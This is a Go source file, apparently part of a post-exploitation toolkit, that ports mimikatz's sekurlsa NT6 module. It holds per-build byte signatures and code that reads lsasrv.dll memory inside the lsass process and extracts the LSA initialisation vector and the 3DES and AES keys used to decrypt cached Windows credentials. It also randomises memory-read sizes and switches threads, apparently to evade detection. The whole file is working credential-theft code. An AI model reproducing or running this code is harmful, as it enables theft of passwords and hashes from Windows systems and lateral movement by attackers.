package kiwi

import (
	"bytes"
	"fmt"
	"runtime"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/security"
)

type lsaNT6 struct {
	ctx *Kiwi

	iv      []byte
	key3DES *api.BcryptKey
	keyAES  *api.BcryptKey
}

func newLSA6(ctx *Kiwi) *lsaNT6 {
	return &lsaNT6{ctx: ctx}
}

func (lsa *lsaNT6) logf(lv logger.Level, format string, log ...interface{}) {
	lsa.ctx.logger.Printf(lv, "kiwi-lsa", format, log...)
}

func (lsa *lsaNT6) log(lv logger.Level, log ...interface{}) {
	lsa.ctx.logger.Println(lv, "kiwi-lsa", log...)
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c

var (
	patternWin7X64LSAInitProtectedMemoryKey = []byte{
		0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D,
	}
	patternWin8X64LSAInitProtectedMemoryKey = []byte{
		0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D,
	}
	patternWin10X64LSAInitProtectedMemoryKey = []byte{
		0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D, 0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15,
	}

	lsaInitProtectedMemoryKeyReferencesX64 = []*patchGeneric{
		{
			minBuild: buildWinVista,
			search: &patchPattern{
				length: len(patternWin7X64LSAInitProtectedMemoryKey),
				data:   patternWin7X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 63, off1: -69, off2: 25},
		},
		{
			minBuild: buildWin7,
			search: &patchPattern{
				length: len(patternWin7X64LSAInitProtectedMemoryKey),
				data:   patternWin7X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 59, off1: -61, off2: 25},
		},
		{
			minBuild: buildWin8,
			search: &patchPattern{
				length: len(patternWin8X64LSAInitProtectedMemoryKey),
				data:   patternWin8X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 62, off1: -70, off2: 13},
		},
		{
			minBuild: buildWin10v1507,
			search: &patchPattern{
				length: len(patternWin10X64LSAInitProtectedMemoryKey),
				data:   patternWin10X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 61, off1: -73, off2: 16},
		},
		{
			minBuild: buildWin10v1809,
			search: &patchPattern{
				length: len(patternWin10X64LSAInitProtectedMemoryKey),
				data:   patternWin10X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 67, off1: -89, off2: 16},
		},
	}
)

var (
	patternWinAllX86LSAInitProtectedMemoryKey = []byte{0x6A, 0x02, 0x6A, 0x10, 0x68}

	lsaInitProtectedMemoryKeyReferencesX86 = []*patchGeneric{
		{
			minBuild: buildWin7,
			search: &patchPattern{
				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
				data:   patternWinAllX86LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 5, off1: -76, off2: -21},
		},
		{
			minBuild: buildWin8,
			search: &patchPattern{
				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
				data:   patternWinAllX86LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 5, off1: -69, off2: -18},
		},
		{
			minBuild: buildWin81,
			search: &patchPattern{
				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
				data:   patternWinAllX86LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 5, off1: -79, off2: -22},
		},
		{
			minBuild: buildWin10v1507,
			search: &patchPattern{
				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
				data:   patternWinAllX86LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 5, off1: -79, off2: -22},
		},
	}
)

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c

func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
	if len(lsa.iv) == 16 && lsa.key3DES != nil && lsa.keyAES != nil {
		return nil
	}
	// read lsasrv memory
	lsasrv, err := lsa.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
	if err != nil {
		return err
	}
	doneRead := security.SwitchThreadAsync()
	defer lsa.ctx.waitSwitchThreadAsync(doneRead)
	size := uintptr(lsasrv.size - (256 - lsa.ctx.rand.Int(256)))
	memory := make([]byte, size)
	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], size)
	if err != nil {
		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
	}
	// select patch and find pattern
	var patches []*patchGeneric
	switch runtime.GOARCH {
	case "386":
		patches = lsaInitProtectedMemoryKeyReferencesX86
	case "amd64":
		patches = lsaInitProtectedMemoryKeyReferencesX64
	}
	patch := lsa.ctx.selectGenericPatch(patches)
	index := bytes.Index(memory, patch.search.data)
	if index == -1 {
		return errors.New("failed to search lsa init protected memory reference pattern")
	}
	doneIV := security.SwitchThreadAsync()
	defer lsa.ctx.waitSwitchThreadAsync(doneIV)
	// read offset about iv
	address := lsasrv.address + uintptr(index+patch.offsets.off0)
	var offset uint32
	size = unsafe.Sizeof(offset)
	err = lsa.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about iv")
	}
	// read iv data
	address += unsafe.Sizeof(offset) + uintptr(offset)
	lsa.iv = make([]byte, 16)
	err = lsa.ctx.readMemory(pHandle, address, &lsa.iv[0], uintptr(16))
	if err != nil {
		return errors.WithMessage(err, "failed to read iv data")
	}
	lsa.log(logger.Debug, "iv data:", lsa.iv)
	// acquire 3DES key
	address = lsasrv.address + uintptr(index+patch.offsets.off1)
	err = lsa.acquireKey(pHandle, address, "3DES")
	if err != nil {
		return errors.WithMessage(err, "failed to acquire 3DES key")
	}
	// acquire AES key
	address = lsasrv.address + uintptr(index+patch.offsets.off2)
	err = lsa.acquireKey(pHandle, address, "AES")
	if err != nil {
		return errors.WithMessage(err, "failed to acquire AES key")
	}
	lsa.log(logger.Info, "acquire NT6 LSA keys successfully")
	return nil
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.h

// nolint:structcheck, unused
type bcryptHandleKey struct {
	size     uint32
	tag      uint32  // U U U R
	hAlg     uintptr // algorithm handle
	key      uintptr // bcryptKey
	unknown0 uintptr
}

// nolint:structcheck, unused
type bcryptKey struct {
	size     uint32
	tag      uint32 // M S S K
	typ      uint32
	unknown0 uint32
	unknown1 uint32
	unknown2 uint32
	hardKey  hardKey
}

// nolint:structcheck, unused
type bcryptKey8 struct {
	size     uint32
	tag      uint32 // M S S K
	typ      uint32
	unknown0 uint32
	unknown1 uint32
	unknown2 uint32
	unknown3 uint32
	unknown4 uint32
	hardKey  hardKey
}

// nolint:structcheck, unused
type bcryptKey81 struct {
	size     uint32
	tag      uint32 // M S S K
	typ      uint32
	unknown0 uint32
	unknown1 uint32
	unknown2 uint32
	unknown3 uint32
	unknown4 uint32
	unknown5 uintptr // before, align in x64
	unknown6 uint32
	unknown7 uint32
	unknown8 uint32
	unknown9 uint32
	hardKey  hardKey
}

type hardKey struct {
	secret uint32
	data   [4]byte // not used
}

func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm string) error {
	const (
		bhKeyTag = 0x55555552 // U U U R
		bKeyTag  = 0x4D53534B // M S S K
	)
	doneAddr := security.SwitchThreadAsync()
	defer lsa.ctx.waitSwitchThreadAsync(doneAddr)
	var offset int32
	size := unsafe.Sizeof(offset)
	err := lsa.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about bcrypt handle key")
	}
	address += unsafe.Sizeof(offset) + uintptr(offset)
	var bhkAddr uintptr
	size = unsafe.Sizeof(bhkAddr)
	err = lsa.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&bhkAddr)), size)
	if err != nil {
		return errors.WithMessage(err, "failed to read address about bcrypt handle key")
	}
	var bhKey bcryptHandleKey
	size = unsafe.Sizeof(bhKey)
	err = lsa.ctx.readMemoryEnd(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhKey)), size)
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt handle key")
	}
	if bhKey.tag != bhKeyTag {
		return errors.New("read invalid bcrypt handle key")
	}
	// read hard key data
	var (
		bcryptKeySize   uintptr
		bcryptKeyOffset uintptr
	)
	_, _, build := lsa.ctx.getWindowsVersion()
	switch {
	case build < buildMinWin8:
		bcryptKeySize = unsafe.Sizeof(bcryptKey{})
		bcryptKeyOffset = unsafe.Offsetof(bcryptKey{}.hardKey)
	case build < buildMinWin81:
		bcryptKeySize = unsafe.Sizeof(bcryptKey8{})
		bcryptKeyOffset = unsafe.Offsetof(bcryptKey8{}.hardKey)
	default:
		bcryptKeySize = unsafe.Sizeof(bcryptKey81{})
		bcryptKeyOffset = unsafe.Offsetof(bcryptKey81{}.hardKey)
	}
	doneKey := security.SwitchThreadAsync()
	defer lsa.ctx.waitSwitchThreadAsync(doneKey)
	bKey := make([]byte, bcryptKeySize)
	err = lsa.ctx.readMemoryEnd(pHandle, bhKey.key, &bKey[0], bcryptKeySize)
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt key")
	}
	if *(*uint32)(unsafe.Pointer(&bKey[unsafe.Offsetof(bcryptKey{}.tag)])) != bKeyTag {
		return errors.New("read invalid bcrypt key")
	}
	hKey := *(*hardKey)(unsafe.Pointer(&bKey[bcryptKeyOffset]))
	hardKeyData := make([]byte, int(hKey.secret))
	address = bhKey.key + bcryptKeyOffset + unsafe.Offsetof(hardKey{}.data)
	err = lsa.ctx.readMemory(pHandle, address, &hardKeyData[0], uintptr(len(hardKeyData)))
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt handle key")
	}
	lsa.logf(logger.Debug, "%s hard key: 0x%X", algorithm, hardKeyData)
	return lsa.generateSymmetricKey(hardKeyData, algorithm)
}

func (lsa *lsaNT6) generateSymmetricKey(hardKeyData []byte, algorithm string) error {
	done := security.SwitchThreadAsync()
	defer lsa.ctx.waitSwitchThreadAsync(done)
	// open provider
	algHandle, err := api.BCryptOpenAlgorithmProvider(algorithm, "", 0)
	if err != nil {
		return err
	}
	// set mode
	prop := "ChainingMode"
	var (
		mode []uint16
		key  **api.BcryptKey
	)
	switch algorithm {
	case "3DES":
		mode = windows.StringToUTF16("ChainingModeCBC")
		key = &lsa.key3DES
	case "AES":
		mode = windows.StringToUTF16("ChainingModeCFB")
		key = &lsa.keyAES
	default:
		panic(fmt.Sprintf("invalid algorithm: %s", algorithm))
	}
	size := uint32(len(mode))
	err = api.BCryptSetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&mode[0])), size, 0)
	if err != nil {
		return err
	}
	// read object length
	prop = "ObjectLength"
	var length uint32
	size = uint32(unsafe.Sizeof(length))
	_, err = api.BCryptGetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&length)), size, 0)
	if err != nil {
		return err
	}
	bk := &api.BcryptKey{
		Provider: algHandle,
		Object:   make([]byte, length),
		Secret:   hardKeyData,
	}
	err = api.BCryptGenerateSymmetricKey(bk)
	if err != nil {
		return err
	}
	*key = bk
	return nil
}

func (lsa *lsaNT6) Close() error {
	if lsa.key3DES != nil {
		err := lsa.key3DES.Destroy()
		if err != nil {
			return err
		}
		lsa.key3DES = nil
	}
	if lsa.keyAES != nil {
		err := lsa.keyAES.Destroy()
		if err != nil {
			return err
		}
		lsa.keyAES = nil
	}
	lsa.ctx = nil
	return nil
}
